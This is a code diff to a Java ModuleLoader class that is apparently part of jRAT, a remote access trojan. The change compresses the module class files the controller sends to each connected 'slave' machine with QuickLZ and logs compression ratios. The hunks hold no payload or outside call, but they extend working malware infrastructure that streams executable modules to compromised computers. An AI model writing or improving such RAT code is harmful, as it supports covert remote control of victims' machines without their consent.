@@ -2,6 +2,7 @@ package jrat.controller.modules;
 
 import jrat.api.Module;
 import jrat.common.Logger;
+import jrat.common.compress.QuickLZ;
 import jrat.controller.AbstractSlave;
 
 import java.io.ByteArrayOutputStream;
@@ -94,6 +95,7 @@ public class ModuleLoader {
 
         for (ModuleData mod : modules) {
             int total = 0;
+            int totalUncompressed = 0;
 
             JarInputStream jis = new JarInputStream(new FileInputStream(mod.getClientFile()));
 
@@ -101,6 +103,8 @@ public class ModuleLoader {
             String mainClass = mf.getMainAttributes().getValue("Main-Class");
 
             slave.writeLine(mainClass);
+
+            Logger.log(mainClass);
 
             JarEntry entry;
             while ((entry = jis.getNextJarEntry()) != null) {
@@ -121,9 +125,13 @@ public class ModuleLoader {
                 out.close();
 
                 byte[] array = out.toByteArray();
-                total += array.length;
 
-                Logger.log("\twriting class " + entry.getName() + " (" + array.length + " b)");
+                int uncompressedSize = array.length;
+                totalUncompressed += array.length;
+
+                array = QuickLZ.compress(array, 3);
+                total += array.length;
+                Logger.log("\tclass " + entry.getName() + " (" + uncompressedSize + " -> " + array.length + " bytes)");
 
                 slave.writeBoolean(true);
                 slave.writeBoolean(entry.getName().endsWith(".class"));
@@ -135,7 +143,7 @@ public class ModuleLoader {
 
             // indicate that there are no entries left for this module
             slave.writeBoolean(false);
-            Logger.log("wrote module '" + mainClass + "' (" + total + " b)");
+            Logger.log("\ttotal: " + total + " bytes (" + (((float) total / (float) totalUncompressed) * 100f) + "%)");
         }
     }
 }
